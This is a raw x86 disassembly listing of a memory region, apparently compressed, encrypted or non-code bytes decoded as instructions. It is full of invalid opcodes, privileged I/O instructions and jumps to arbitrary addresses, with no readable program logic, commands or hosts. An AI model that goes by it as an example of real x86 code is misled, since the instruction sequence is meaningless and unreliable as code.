  41df0c:	in     eax,0x41
  41df0e:	sub    eax,0xafc38243
  41df13:	pop    es
  41df14:	in     eax,0xb5
  41df16:	and    edx,edi
  41df18:	push   0x77
  41df1a:	js     0x41dece
  41df1c:	xchg   BYTE PTR [edi-0x2c],al
  41df1f:	stos   BYTE PTR es:[edi],al
  41df20:	sub    al,BYTE PTR [ebp+0x12f45717]
  41df26:	mov    ecx,0xf5749179
  41df2b:	dec    edx
  41df2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df2d:	in     eax,0x80
  41df2f:	popf   
  41df30:	mov    edi,0x41dad0ec
  41df35:	je     0x41df45
  41df37:	push   ds
  41df38:	jb     0x41df4e
  41df3a:	sbb    BYTE PTR [edi-0x579a12a3],al
  41df40:	dec    eax
  41df41:	xor    bh,BYTE PTR [ecx-0x66]
  41df44:	mov    ch,0xb2
  41df46:	icebp  
  41df47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df48:	push   ds
  41df49:	adc    DWORD PTR [ecx+0x6e],ebx
  41df4c:	(bad)  
  41df4d:	mov    ecx,0x8e28869f
  41df52:	shl    BYTE PTR [ecx],cl
  41df54:	fsubr  DWORD PTR [ebp-0x2c1f5df1]
  41df5a:	(bad)  
  41df5b:	stc    
  41df5c:	cwde   
  41df5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df5e:	sub    al,0x3e
  41df60:	nop
  41df61:	pusha  
  41df62:	cld    
  41df63:	sti    
  41df64:	adc    al,ah
  41df66:	std    
  41df67:	or     ch,dh
  41df69:	add    al,0xc6
  41df6b:	adc    BYTE PTR [ecx+0x3c8e5708],cl
  41df71:	sub    DWORD PTR [eax-0xd],esi
  41df74:	cpuid  
  41df76:	xchg   BYTE PTR [ebx-0x6e],dl
  41df79:	cmp    esp,ebp
  41df7b:	out    dx,eax
  41df7c:	sub    eax,0x8082e78c
  41df81:	pop    ss
  41df82:	lahf   
  41df83:	pusha  
  41df84:	in     eax,0x6
  41df86:	aam    0x7c
  41df88:	aam    0xc5
  41df8a:	push   esp
  41df8b:	cwde   
  41df8c:	enter  0x8b8c,0xa9
  41df90:	mov    eax,ds:0x8c401498
  41df95:	pushf  
  41df96:	and    cl,BYTE PTR ds:0xc79d0028
  41df9c:	jno    0x41df7c
  41df9e:	sti    
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	push   edx
  41dfa1:	mov    es,ecx
  41dfa3:	in     al,0x27
  41dfa5:	out    dx,eax
  41dfa6:	call   0x301c69be
  41dfab:	loope  0x41e01a
  41dfad:	jbe    0x41e021
  41dfaf:	test   dl,bl
  41dfb1:	pop    ds
  41dfb2:	push   esp
  41dfb3:	leavew 
  41dfb5:	xchg   ebp,eax
  41dfb6:	shr    BYTE PTR [ecx-0x3d1e2e59],0xe3
  41dfbd:	pop    ds
  41dfbe:	and    BYTE PTR [edx+0x4c1b8273],dl
  41dfc4:	imul   eax,DWORD PTR [ecx+0x5713fcb],0x71
  41dfcb:	sub    DWORD PTR [ecx-0x4f88df37],eax
  41dfd1:	mov    edx,0x8163d319
  41dfd6:	(bad)  
  41dfd7:	mov    eax,0x3cbfa434
  41dfdc:	jo     0x41dfb6
  41dfde:	sbb    BYTE PTR [eax],al
  41dfe0:	cmp    DWORD PTR [esi+0x409bf25c],eax
  41dfe6:	jb     0x41e003
  41dfe8:	adc    dl,BYTE PTR [esi]
  41dfea:	out    dx,eax
  41dfeb:	ret    0x63b5
  41dfee:	loopne 0x41e00d
  41dff0:	fsub   st,st(6)
  41dff2:	cdq    
  41dff3:	cmp    DWORD PTR [ecx+0x5b],esp
  41dff6:	addr16 push ebp
  41dff8:	mov    BYTE PTR [eax],bl
  41dffa:	fisubr DWORD PTR [edi]
  41dffc:	push   cs
  41dffd:	pop    esp
  41dffe:	aas    
  41dfff:	pushf  
  41e000:	shl    BYTE PTR [esi-0x66],1
  41e003:	js     0x41dfda
  41e005:	inc    ebp
  41e006:	fstp   QWORD PTR [ebx+0x17492fee]
  41e00c:	pop    ds
  41e00d:	push   ebp
  41e00e:	mov    dl,BYTE PTR [edx+0x37]
  41e011:	mov    eax,ds:0xef3a4c5a
  41e016:	dec    ebp
  41e017:	cmp    DWORD PTR [ebp+ecx*1+0x1a],eax
  41e01b:	jecxz  0x41dfe1
  41e01d:	mov    bh,0x2a
  41e01f:	test   DWORD PTR [ebx+esi*2],esp
  41e022:	dec    edx
  41e023:	sahf   
  41e024:	or     DWORD PTR [esi],eax
  41e026:	ds pop ss
  41e028:	ja     0x41e014
  41e02a:	inc    edi
  41e02b:	mov    dl,0x4d
  41e02d:	repnz mov bl,0x8d
  41e030:	fmul   DWORD PTR [ecx*8+0x170fc1fe]
  41e037:	leave  
  41e038:	retf   
  41e039:	xchg   BYTE PTR [ebp-0x6a],ch
  41e03c:	retf   0xa6d3
  41e03f:	outs   dx,DWORD PTR ds:[esi]
  41e040:	aaa    
  41e041:	mov    ebx,0x1e662b33
  41e046:	ins    BYTE PTR es:[edi],dx
  41e047:	adc    eax,0x4eff4728
  41e04c:	inc    esp
  41e04d:	ret    
  41e04e:	sub    BYTE PTR [esi+0x1e],0xd5
  41e052:	and    DWORD PTR [ebx+0x286860ec],edi
  41e058:	enter  0xa8fc,0xf4
  41e05c:	or     DWORD PTR [edi+ebx*2+0x1ae69155],edi
  41e063:	int    0x4d
  41e065:	into   
  41e066:	inc    esi
  41e067:	push   esp
  41e068:	add    BYTE PTR [ebx+0x55],ah
  41e06b:	push   ss
  41e06c:	mov    ch,0xe0
  41e06e:	rcr    bh,cl
  41e070:	loopne 0x41e007
  41e072:	int3   
  41e073:	call   0x13b2:0x3b7266f
  41e07a:	sub    DWORD PTR [edi-0x5ef9a5c1],ecx
  41e080:	sahf   
  41e081:	sub    DWORD PTR [ebx+0x22],ebx
  41e084:	pop    ebp
  41e085:	mov    al,0x32
  41e087:	and    ch,BYTE PTR [ebp-0x4c056e2]
  41e08d:	mov    edx,0xd2549790
  41e092:	cmp    DWORD PTR [eax-0x5b],ebp
  41e095:	xchg   ecx,eax
  41e096:	push   ebp
  41e097:	add    ecx,DWORD PTR [ecx+0x2212a68c]
  41e09d:	dec    esp
  41e09e:	sub    BYTE PTR es:[edx-0x10],dh
  41e0a2:	not    BYTE PTR [ebx-0x2536ff9f]
  41e0a8:	sub    dl,BYTE PTR [edi]
  41e0aa:	pop    ebp
  41e0ab:	xor    ecx,ebp
  41e0ad:	(bad)  
  41e0ae:	xlat   BYTE PTR ds:[ebx]
  41e0af:	nop
  41e0b0:	out    dx,al
  41e0b1:	push   cs
  41e0b2:	stc    
  41e0b3:	mov    eax,0x7ff43a92
  41e0b8:	cwde   
  41e0b9:	jmp    0xae87:0x7984e95a
  41e0c0:	xchg   edx,eax
  41e0c1:	cmp    bh,ch
  41e0c3:	jle    0x41e118
  41e0c5:	push   ecx
  41e0c6:	outs   dx,BYTE PTR ds:[esi]
  41e0c7:	stos   DWORD PTR es:[edi],eax
  41e0c8:	mov    dl,0x39
  41e0ca:	or     al,0x77
  41e0cc:	je     0x41e0c0
  41e0ce:	and    BYTE PTR ds:0x5fb99cd5,bl
  41e0d4:	xor    edx,eax
  41e0d6:	xor    edi,eax
  41e0d8:	add    edi,ecx
  41e0da:	jmp    0x41e5ec
  41e0df:	cmp    al,0xc0
  41e0e1:	leave  
  41e0e2:	retf   
  41e0e3:	leave  
  41e0e4:	leave  
  41e0e5:	ret    0xc9c7
  41e0e8:	outs   dx,BYTE PTR ds:[esi]
  41e0e9:	retf   
  41e0ea:	jge    0x41e0de
  41e0ec:	mov    al,0x8
  41e0ee:	out    0xe8,eax
  41e0f0:	mov    ah,0x7f
  41e0f2:	js     0x41e167
  41e0f4:	jl     0x41e16e
  41e0f6:	js     0x41e0df
  41e0f8:	mov    esi,0xddebdac1
  41e0fd:	ss xchg ebp,eax
  41e0ff:	in     al,dx
  41e100:	ins    BYTE PTR es:[edi],dx
  41e101:	sub    eax,0x5b00dbeb
  41e106:	stc    
  41e107:	xor    esi,ebp
  41e109:	push   ds
  41e10a:	mov    ebx,0x4663dfba
  41e10f:	mov    ecx,edx
  41e111:	(bad)  [ecx]
  41e113:	or     al,0x4f
  41e115:	adc    al,0xdd
  41e117:	push   eax
  41e118:	fdiv   QWORD PTR [ebp-0x3a]
  41e11b:	fnstsw WORD PTR [edi+0x5255a751]
  41e121:	xchg   DWORD PTR [ecx+0x3a],edx
  41e124:	jno    0x41e190
  41e126:	push   es
  41e127:	push   esp
  41e128:	push   es
  41e129:	sahf   
  41e12a:	push   edi
  41e12b:	inc    eax
  41e12c:	mov    ebp,0x426a1257
  41e131:	call   DWORD PTR [ebp+0x6a]
  41e134:	out    dx,al
  41e135:	les    eax,FWORD PTR [edi]
  41e137:	bsr    ebx,DWORD PTR [esi]
  41e13a:	xor    ah,bh
  41e13c:	mov    ebp,0x5616190b
  41e141:	outs   dx,BYTE PTR ds:[esi]
  41e142:	pop    ebp
  41e143:	mov    esp,0xc9d02e76
  41e148:	sbb    BYTE PTR [ecx+0x7a],dh
  41e14b:	xor    ecx,DWORD PTR [ebp-0x5ce339fa]
  41e151:	lds    eax,FWORD PTR [ebp+0x38]
  41e154:	gs mov edi,0xb837b9fd
  41e15a:	or     bh,BYTE PTR [esp+edi*8+0x1a06acc0]
  41e161:	fiadd  WORD PTR [esi+edi*1]
  41e164:	mov    esi,DWORD PTR ds:0x7ad00263
  41e16a:	fnstcw WORD PTR [ebx+edi*2+0x48ab6ed6]
  41e171:	or     BYTE PTR [ebx+edx*1],dl
  41e174:	inc    edx
  41e175:	xlat   BYTE PTR ds:[ebx]
  41e176:	mov    bh,0xb1
  41e178:	jne    0x41e19a
  41e17a:	(bad)  
  41e17b:	repz cli 
  41e17d:	sub    eax,0xa2026120
  41e182:	int3   
  41e183:	pushf  
  41e184:	pop    edi
  41e185:	aas    
  41e186:	dec    edx
  41e187:	push   esp
  41e188:	ds (bad) 
  41e18b:	pop    edi
  41e18c:	sub    bl,ch
  41e18e:	sahf   
  41e18f:	mov    bh,0x78
  41e191:	aam    0x1c
  41e193:	mov    bh,0x2a
  41e195:	ins    DWORD PTR es:[edi],dx
  41e196:	dec    edx
  41e197:	leave  
  41e198:	cmp    al,0x36
  41e19a:	lods   al,BYTE PTR ds:[esi]
  41e19b:	push   0xffffff9e
  41e19d:	sbb    ebp,edx
  41e19f:	jmp    0xb256:0xb5bd62d4
  41e1a6:	dec    esi
  41e1a7:	sbb    ah,al
  41e1a9:	cwde   
  41e1aa:	xchg   ecx,eax
  41e1ac:	sub    eax,0x167aa211
  41e1b1:	pop    esi
  41e1b2:	xchg   ecx,eax
  41e1b3:	mov    ?,WORD PTR es:[esi+0x22c77e56]
  41e1ba:	std    
  41e1bb:	or     dh,BYTE PTR [edx-0x2e]
  41e1be:	call   0x127f7271
  41e1c3:	scas   eax,DWORD PTR es:[edi]
  41e1c4:	into   
  41e1c5:	and    BYTE PTR [edx],dh
  41e1c7:	add    DWORD PTR [esi-0xa],ecx
  41e1ca:	lock pop esi
  41e1cc:	not    BYTE PTR [ebp+0x17]
  41e1cf:	lds    edx,FWORD PTR [eax+0x31]
  41e1d2:	lock xchg edi,eax
  41e1d4:	pop    ss
  41e1d5:	xchg   DWORD PTR [esi+0x1b9144df],ebp
  41e1db:	or     BYTE PTR [ecx],bh
  41e1dd:	push   ebx
  41e1de:	hlt    
  41e1df:	mov    eax,0x24c69917
  41e1e4:	sbb    ebp,esp
  41e1e6:	cwde   
  41e1e7:	pop    ds
  41e1e8:	fadd   st,st(5)
  41e1ea:	sub    eax,0x5d83b717
  41e1ef:	mov    ebp,cr7
  41e1f2:	ja     0x41e1ae
  41e1f4:	fisub  WORD PTR [ebx+0x246db959]
  41e1fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1fb:	int3   
  41e1fc:	mov    fs,WORD PTR [eax+0x76]
  41e1ff:	inc    esi
  41e200:	add    DWORD PTR [ecx+esi*2+0x42376a30],ecx
  41e207:	or     al,0x50
  41e209:	push   ds
  41e20a:	pop    edx
  41e20b:	pushf  
  41e20c:	(bad)  
  41e20d:	xor    DWORD PTR [esi+0x12],esi
  41e210:	lods   al,BYTE PTR ds:[esi]
  41e211:	inc    edx
  41e212:	pushf  
  41e213:	(bad)  
  41e215:	mul    esp
  41e217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e218:	jb     0x41e23a
  41e21a:	mov    ah,BYTE PTR [ebx]
  41e21c:	or     DWORD PTR ds:0xa298f6bf,esi
  41e222:	int3   
  41e223:	or     eax,0x54db029d
  41e228:	push   es
  41e229:	out    0x2,eax
  41e22b:	and    al,0x81
  41e22d:	push   ebx
  41e22e:	or     eax,0x72f240c
  41e233:	push   ebp
  41e234:	mov    dh,0xa8
  41e236:	dec    esi
  41e237:	das    
  41e238:	jp     0x41e27e
  41e23a:	sub    ecx,DWORD PTR [edx+0x77]
  41e23d:	clc    
  41e23e:	fs fwait
  41e240:	and    cl,0xc6
  41e243:	ss shr esi,1
  41e246:	mov    ah,0xb6
  41e248:	inc    edi
  41e249:	mov    ebp,DWORD PTR [eax]
  41e24b:	jl     0x41e2a5
  41e24d:	jge    0x41e222
  41e24f:	mov    al,0x56
  41e251:	in     eax,0x9
  41e253:	jl     0x41e2b0
  41e255:	retf   
  41e256:	push   es
  41e257:	inc    eax
  41e258:	lods   al,BYTE PTR ds:[esi]
  41e259:	mov    edi,0x4176014
  41e25e:	mov    ebx,0xd8f4bbcb
  41e263:	sub    DWORD PTR [edi],ecx
  41e265:	dec    eax
  41e266:	enter  0x8bbe,0x25
  41e26a:	test   BYTE PTR [esi+0x41aa7694],dh
  41e270:	mov    ebp,0x2aec2ed4
  41e275:	loope  0x41e2c9
  41e277:	xor    eax,0x9d420207
  41e27c:	sub    eax,0xbf5ac0a4
  41e281:	mov    ds:0x199094d6,al
  41e286:	fdiv   st(0),st
  41e288:	rol    esi,0xd3
  41e28b:	push   ds
  41e28c:	test   eax,0xbc658fa6
  41e291:	xlat   BYTE PTR ds:[ebx]
  41e292:	hlt    
  41e293:	ins    DWORD PTR es:[edi],dx
  41e294:	sub    BYTE PTR [edx+0x6d],0x7d
  41e298:	lahf   
  41e299:	ins    DWORD PTR es:[edi],dx
  41e29a:	or     DWORD PTR [ebx+0x6c],edi
  41e29d:	lods   eax,DWORD PTR ds:[esi]
  41e29e:	iret   
  41e29f:	(bad)  
  41e2a0:	ja     0x41e254
  41e2a2:	cwde   
  41e2a3:	and    esp,DWORD PTR [edx+0x1844d6a6]
  41e2a9:	push   ebx
  41e2aa:	push   edi
  41e2ab:	inc    ecx
  41e2ac:	jmp    0xc1a16fe1
  41e2b1:	push   ss
  41e2b2:	push   0x518bda0e
  41e2b7:	shr    BYTE PTR [eax],1
  41e2b9:	popa   
  41e2ba:	mov    ebp,0x36a49bdd
  41e2bf:	jns    0x41e268
  41e2c1:	xchg   ebx,eax
  41e2c2:	and    bl,BYTE PTR [ebp-0xd]
  41e2c5:	jnp    0x41e269
  41e2c7:	and    DWORD PTR [edi],eax
  41e2c9:	inc    esp
  41e2ca:	stc    
  41e2cb:	popa   
  41e2cc:	sub    cl,ah
  41e2ce:	es jl  0x41e2e7
  41e2d1:	push   ecx
  41e2d2:	inc    esp
  41e2d3:	stos   DWORD PTR es:[edi],eax
  41e2d4:	mov    al,ds:0xd7db982b
  41e2d9:	xchg   edx,eax
  41e2da:	cmp    esp,DWORD PTR ds:0x149ebe25
  41e2e0:	(bad)  [ecx-0x5a92c40f]
  41e2e6:	push   0x7f
  41e2e8:	sub    al,ah
  41e2ea:	int    0x36
  41e2ec:	push   edx
  41e2ed:	mov    ebx,0x739c390a
  41e2f2:	jp     0x41e355
  41e2f4:	outs   dx,BYTE PTR ds:[esi]
  41e2f5:	loope  0x41e2d0
  41e2f7:	stos   DWORD PTR es:[edi],eax
  41e2f8:	adc    bl,BYTE PTR [ebp+0x2a]
  41e2fb:	jmp    0x80a10ad
  41e300:	sbb    al,0xa0
  41e302:	cdq    
  41e303:	cs lahf 
  41e305:	mov    bl,0x3c
  41e307:	mov    cl,0x46
  41e309:	pop    ebp
  41e30a:	mov    dh,0xf6
  41e30c:	mov    eax,ds:0x9df64aba
  41e311:	cmp    DWORD PTR [edi+0x8],eax
  41e314:	xor    BYTE PTR [edi+0x43fc6482],ch
  41e31a:	fwait
  41e31b:	out    0xc3,eax
  41e31d:	inc    edx
  41e31e:	dec    ebp
  41e31f:	mov    bh,0x69
  41e321:	imul   ebp,DWORD PTR [edi-0x326dc0ca],0xffffffb8
  41e328:	xchg   ebp,eax
  41e329:	loope  0x41e352
  41e32b:	retf   
  41e32c:	inc    edx
  41e32d:	rol    DWORD PTR [edi],cl
  41e32f:	mov    dh,bl
  41e331:	aaa    
  41e332:	sbb    ah,BYTE PTR [ecx+ebp*4]
  41e335:	scas   al,BYTE PTR es:[edi]
  41e336:	lock cmp esi,DWORD PTR [ecx-0x73ba65ab]
  41e33d:	add    BYTE PTR [ebp-0x62d7f914],cl
  41e343:	int3   
  41e344:	jg     0x41e374
  41e346:	ss je  0x41e386
  41e349:	mov    BYTE PTR [ebx],bh
  41e34b:	pop    edi
  41e34c:	shl    esp,cl
  41e34e:	jnp    0x41e39b
  41e350:	lds    edi,FWORD PTR [esi+0x4a]
  41e353:	dec    ecx
  41e354:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41e356:	jp     0x41e308
  41e358:	outs   dx,DWORD PTR ds:[esi]
  41e359:	mov    bl,0xf5
  41e35b:	jnp    0x41e361
  41e35d:	xlat   BYTE PTR ds:[ebx]
  41e35e:	mov    esi,0x544d92c6
  41e363:	retf   0xc6c
  41e366:	mov    eax,esp
  41e368:	fprem  
  41e36a:	clc    
  41e36b:	xor    esp,DWORD PTR [ebx]
  41e36d:	pop    ss
  41e36e:	in     al,dx
  41e36f:	lea    esp,[edi]
  41e371:	nop
  41e372:	pop    esp
  41e373:	jle    0x41e394
  41e375:	ins    BYTE PTR es:[edi],dx
  41e376:	push   es
  41e377:	mov    dl,0xe4
  41e379:	ss gs aas 
  41e37c:	loop   0x41e30b
  41e37e:	jae    0x41e3e2
  41e380:	out    dx,eax
  41e381:	ins    BYTE PTR es:[edi],dx
  41e382:	mov    ecx,0x677900a9
  41e387:	push   ecx
  41e388:	cmp    DWORD PTR [esi-0x1a296cf1],0x36
  41e38f:	cld    
  41e390:	sbb    al,0x7d
  41e392:	sbb    DWORD PTR [edx],0x60
  41e395:	xor    ah,BYTE PTR [edi-0x51]
  41e398:	push   esp
  41e399:	aad    0x87
  41e39b:	fimul  WORD PTR [ebp+ebp*4-0x2f]
  41e39f:	out    0x61,al
  41e3a1:	into   
  41e3a2:	sub    ebx,esp
  41e3a4:	int3   
  41e3a5:	es cs clc 
  41e3a8:	xchg   edx,eax
  41e3a9:	leave  
  41e3aa:	add    al,bh
  41e3ac:	xchg   ecx,eax
  41e3ad:	ss (bad) 
  41e3af:	cld    
  41e3b0:	call   0xcc92:0xa4470f75
  41e3b7:	xor    bh,BYTE PTR [edi]
  41e3b9:	scas   eax,DWORD PTR es:[edi]
  41e3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3bb:	cwde   
  41e3bc:	jbe    0x41e3cc
  41e3be:	fmul   DWORD PTR [edx]
  41e3c0:	ins    DWORD PTR es:[edi],dx
  41e3c1:	test   BYTE PTR [esi+ecx*8+0x0],dl
  41e3c5:	sub    ch,bh
  41e3c7:	loope  0x41e3ee
  41e3c9:	dec    esp
  41e3ca:	sahf   
  41e3cb:	xchg   ebp,eax
  41e3cc:	pop    ds
  41e3cd:	mov    BYTE PTR [ebp+0x6a9ab2bf],ah
  41e3d3:	jecxz  0x41e399
  41e3d5:	and    bl,BYTE PTR [ebx-0x17]
  41e3d8:	bound  edi,QWORD PTR [eax-0x5b444245]
  41e3de:	push   0xb
  41e3e0:	(bad)  
  41e3e1:	or     bl,BYTE PTR [ecx]
  41e3e3:	mov    ebp,0x691777bc
  41e3e8:	les    esi,FWORD PTR [ebp+0x4259b468]
  41e3ee:	in     al,dx
  41e3ef:	lods   al,BYTE PTR ds:[esi]
  41e3f0:	sub    BYTE PTR [edx],cl
  41e3f2:	into   
  41e3f3:	jp     0x41e409
  41e3f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3f6:	xchg   ebx,eax
  41e3f7:	ins    BYTE PTR es:[edi],dx
  41e3f8:	push   ecx
  41e3f9:	lds    ebp,FWORD PTR gs:[esi-0x6b]
  41e3fd:	(bad)  
  41e3ff:	fs adc al,0x4b
  41e402:	mov    bl,0xba
  41e404:	or     BYTE PTR [ebx-0x34415e13],cl
  41e40a:	inc    edx
  41e40b:	inc    esp
  41e40c:	fs push cs
  41e40e:	popf   
  41e40f:	test   eax,0x4036aca6
  41e414:	dec    ecx
  41e415:	mov    ds:0x1591d321,al
  41e41a:	push   esi
  41e41b:	xor    al,0x8e
  41e41d:	aad    0xf6
  41e41f:	mov    WORD PTR [esi-0x166dca07],es
  41e425:	fwait
  41e426:	push   ebx
  41e427:	cdq    
  41e428:	rcr    BYTE PTR [ebp+eiz*1+0x6d],0x93
  41e42d:	pop    esp
  41e42e:	jb     0x41e3df
  41e430:	cmp    al,0x1
  41e432:	mov    dl,0x75
  41e434:	inc    ecx
  41e435:	aam    0xdb
  41e437:	or     eax,0xb518a60f
  41e43c:	push   0xe78d17ef
  41e441:	mov    BYTE PTR [eax+0x21],bl
  41e444:	dec    esi
  41e445:	add    BYTE PTR [ebx+edi*1],dh
  41e448:	loopne 0x41e3cc
  41e44a:	or     ecx,ebp
  41e44c:	push   DWORD PTR [ebp+0x26e60285]
  41e452:	and    eax,0xffffffd1
  41e455:	rol    DWORD PTR [ebx+0x29f188c5],0x61
  41e45c:	mov    cs:0x1999ed45,al
  41e462:	repz xchg ebx,eax
  41e464:	jg     0x41e4ad
  41e466:	dec    esi
  41e467:	jecxz  0x41e435
  41e469:	aas    
  41e46a:	add    BYTE PTR [ebp+edx*4+0x4b17622a],cl
  41e471:	int3   
  41e472:	bnd jns 0x41e415
  41e475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e476:	shr    BYTE PTR [ebx-0x186759d7],cl
  41e47c:	sbb    bl,BYTE PTR [ebx+ebp*4]
  41e47f:	(bad)  
  41e480:	cld    
  41e481:	mov    al,0x9a
  41e483:	cmp    eax,0x7661d0db
  41e488:	mov    dl,0xf4
  41e48a:	inc    ecx
  41e48b:	mov    ds:0xd943d2b5,al
  41e490:	pop    esi
  41e491:	imul   ecx,edi,0xe
  41e494:	cmp    ah,BYTE PTR [edx-0x3609aeb8]
  41e49a:	jle    0x41e4af
  41e49c:	sbb    eax,DWORD PTR [edx-0x1fbdf7f]
  41e4a2:	lea    eax,ds:0xbc5dec5e
  41e4a8:	mov    dh,0x82
  41e4aa:	fwait
  41e4ab:	ins    DWORD PTR es:[edi],dx
  41e4ac:	std    
  41e4ad:	pop    esi
  41e4af:	sbb    ah,BYTE PTR [esi+0x6d]
  41e4b2:	mov    ecx,0xe141b036
  41e4b7:	pop    ebp
  41e4b8:	mov    ah,0x8c
  41e4ba:	mov    al,ds:0x3d89222d
  41e4bf:	ja     0x41e4fd
  41e4c1:	cdq    
  41e4c2:	push   ebx
  41e4c3:	int    0xcc
  41e4c5:	outs   dx,BYTE PTR ds:[esi]
  41e4c6:	mov    ecx,0x83e1ed65
  41e4cb:	push   ss
  41e4cc:	jne    0x41e4fe
  41e4ce:	xchg   edx,ebx
  41e4d0:	inc    edx
  41e4d1:	jmp    0x34b47d3
  41e4d6:	inc    esp
  41e4d7:	fcomp  DWORD PTR [edx+0x29]
  41e4da:	pushf  
  41e4db:	jmp    0x41e537
  41e4dd:	dec    edx
  41e4de:	add    eax,0x853426e9
  41e4e4:	and    edi,ecx
  41e4e6:	mov    bl,0x35
  41e4e8:	into   
  41e4e9:	imul   DWORD PTR [eax+eiz*1]
  41e4ec:	jp     0x41e54f
  41e4ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4ef:	inc    edi
  41e4f0:	arpl   ax,cx
  41e4f2:	test   eax,0x63ac241e
  41e4f7:	pop    edi
  41e4f8:	lds    ecx,FWORD PTR [ecx-0x3d824b29]
  41e4fe:	pop    ebp
  41e4ff:	loope  0x41e4ef
  41e501:	xlat   BYTE PTR ds:[ebx]
  41e502:	arpl   WORD PTR [ebp-0x563bde4],bp
  41e508:	xor    al,0x7a
  41e50a:	std    
  41e50b:	inc    ebp
  41e50c:	pop    edx
  41e50d:	pop    edx
  41e50e:	imul   edi,edx,0xca60e3d
  41e514:	inc    eax
  41e515:	cdq    
  41e516:	and    ecx,DWORD PTR ds:0x9fce856a
  41e51c:	jl     0x41e587
  41e51e:	xchg   esp,eax
  41e51f:	mov    ebx,0xa62949d5
  41e524:	fcom   QWORD PTR [edx-0x41]
  41e527:	jno    0x41e4b3
  41e529:	retf   0x166c
  41e52c:	xor    al,0xc7
  41e52e:	sbb    esi,DWORD PTR [esi]
  41e530:	xor    bh,bh
  41e532:	fimul  DWORD PTR [ebx+0x4d211471]
  41e538:	sbb    ebp,ebp
  41e53a:	push   0x6c
  41e53c:	mov    bl,0x3d
  41e53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e53f:	shl    DWORD PTR [edx-0x582c58bf],cl
  41e545:	not    ebx
  41e547:	outs   dx,BYTE PTR ds:[esi]
  41e548:	das    
  41e549:	jo     0x41e580
  41e54b:	rol    BYTE PTR [ebp-0x54],0xca
  41e54f:	call   0xf3ff:0xb8c40cdf
  41e556:	(bad)  
  41e557:	shl    BYTE PTR [eax],cl
  41e559:	xor    eax,0xf6f37260
  41e55e:	push   edi
  41e55f:	scas   al,BYTE PTR es:[di]
  41e561:	inc    edx
  41e562:	mov    BYTE PTR [esi+ecx*1],ch
  41e565:	loopne 0x41e53d
  41e567:	mov    esp,0x531d2fd2
  41e56c:	cmp    bl,BYTE PTR [ecx-0x72]
  41e56f:	sub    DWORD PTR [eax+0x2c80cccc],0xffffffbe
  41e576:	push   eax
  41e577:	mov    dl,0x63
  41e579:	dec    ecx
  41e57a:	jno    0x41e54c
  41e57c:	cmp    al,0x89
  41e57e:	daa    
  41e57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e580:	cs scas al,BYTE PTR es:[edi]
  41e582:	xlat   BYTE PTR ds:[ebx]
  41e583:	lods   al,BYTE PTR ds:[esi]
  41e584:	xor    DWORD PTR [esi],edx
  41e586:	xor    di,ax
  41e589:	pop    ebp
  41e58a:	add    esi,DWORD PTR ss:[ecx-0x7d]
  41e58e:	enter  0x3ec,0x2b
  41e592:	out    0x2d,al
  41e594:	pusha  
  41e595:	cmp    eax,0xaec9a5cb
  41e59a:	loop   0x41e555
  41e59c:	je     0x41e610
  41e59e:	nop
  41e59f:	jle    0x41e531
  41e5a1:	jbe    0x41e60a
  41e5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5a4:	retf   0xbf3c
  41e5a7:	sbb    ah,bl
  41e5a9:	push   ss
  41e5aa:	sahf   
  41e5ab:	mov    cs,WORD PTR [eax-0x4d]
  41e5ae:	lods   al,BYTE PTR ds:[esi]
  41e5af:	outs   dx,DWORD PTR ds:[esi]
  41e5b0:	cmc    
  41e5b1:	xchg   edi,eax
  41e5b2:	sub    DWORD PTR [edi-0x16],esp
  41e5b5:	dec    ecx
  41e5b6:	call   0xfa12862d
  41e5bb:	(bad)  
  41e5bc:	fcomp  QWORD PTR [esi+0x38d35e3a]
  41e5c2:	dec    ecx
  41e5c3:	jo     0x41e636
  41e5c5:	les    ebp,FWORD PTR [edx+0x50d8bd9b]
  41e5cb:	pop    ebx
  41e5cc:	inc    ebp
  41e5cd:	xchg   edx,eax
  41e5ce:	sbb    eax,0x1979a98e
  41e5d3:	(bad)  
  41e5d4:	ja     0x41e5a6
  41e5d6:	sbb    BYTE PTR [ecx+0x17],dl
  41e5d9:	xchg   esp,eax
  41e5da:	pop    ss
  41e5db:	fstp   QWORD PTR [ecx+0x36]
  41e5de:	fnsetpm(287 only) 
  41e5e0:	and    BYTE PTR [ecx],ch
  41e5e2:	rol    BYTE PTR [ebx],1
  41e5e4:	add    DWORD PTR [ebx-0x2f],0xffffffeb
  41e5e8:	loope  0x41e5c7
  41e5ea:	and    edi,DWORD PTR [ecx+0xde9d103]
  41e5f0:	add    eax,0xc6d10000
  41e5f5:	rol    eax,cl
  41e5f7:	fcmovnu st,st(1)
  41e5f9:	(bad)  
  41e5fb:	jp     0x41e5c3
  41e5fd:	or     DWORD PTR [eax+ebx*1-0x1c151ba7],0xffffffbf
  41e605:	jg     0x41e67f
  41e607:	jae    0x41e685
  41e609:	js     0x41e683
  41e60b:	clc    
  41e60c:	or     edx,DWORD PTR [eax]
  41e60e:	dec    edx
  41e60f:	fst    DWORD PTR [eax+0x90efd4e]
  41e615:	mov    eax,ds:0x2d1de952
  41e61a:	sub    eax,0x96b7455b
  41e61f:	pushf  
  41e620:	sbb    ebx,DWORD PTR [esp+eax*2-0x68197f9f]
  41e627:	loopne 0x41e5dc
  41e629:	(bad)  
  41e62a:	jns    0x41e646
  41e62c:	pop    ebx
  41e62d:	cmp    eax,0x91274937
  41e632:	(bad)  
  41e633:	rcr    bh,1
  41e635:	out    dx,eax
  41e636:	retf   
  41e637:	mov    bh,0x3a
  41e639:	adc    edi,DWORD PTR [edx-0x38]
  41e63c:	sbb    esp,DWORD PTR [ebx+0x6f]
  41e63f:	mov    edx,0x1390cc89
  41e644:	push   es
  41e645:	jg     0x41e62d
  41e647:	test   BYTE PTR [eax],cl
